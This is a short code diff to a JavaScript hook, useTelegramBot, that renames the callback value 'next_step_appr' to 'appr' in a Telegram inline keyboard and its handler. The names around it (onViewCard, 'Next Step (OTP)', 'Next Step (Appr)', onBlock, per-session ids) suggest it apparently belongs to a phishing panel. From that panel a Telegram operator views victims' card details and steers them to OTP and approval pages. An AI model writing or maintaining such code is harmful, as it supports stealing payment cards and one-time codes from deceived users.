@@ -90,7 +90,7 @@ export const useTelegramBot = (sessionId, onApprove, onDeny, onViewCard, onNextS
       const keyboard = {
         inline_keyboard: [
           [
-            { text: "➡️ Next Step (Appr)", callback_data: `next_step_appr_${sessionId}` },
+            { text: "➡️ Next Step (Appr)", callback_data: `appr_${sessionId}` },
             { text: "➡️ Next Step (OTP)", callback_data: `next_${sessionId}` }
           ],
           [
@@ -609,7 +609,7 @@ export const useTelegramBot = (sessionId, onApprove, onDeny, onViewCard, onNextS
                 console.log('🚫 Calling onBlock callback');
                 onBlock?.();
               }
-              else if (action === 'next_step_appr') {
+              else if (action === 'appr') {
                 console.log('🟢 Calling onNextStepAppr callback - NAVIGATING TO NEXTSTEPAPPR');
                 console.log('Calling onNextStepAppr callback');
                 onNextStepAppr?.();
@@ -618,7 +618,7 @@ export const useTelegramBot = (sessionId, onApprove, onDeny, onViewCard, onNextS
               try {
                 await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`, {
                   callback_query_id: update.callback_query.id,
-                  text: action === 'next_step_appr' ? "✅ Redirecting to confirmation page..." : "✅ Request processed!"
+                  text: action === 'appr' ? "✅ Redirecting to confirmation page..." : "✅ Request processed!"
                 });
               } catch (callbackError) {
                 console.error('Error answering callback:', callbackError);
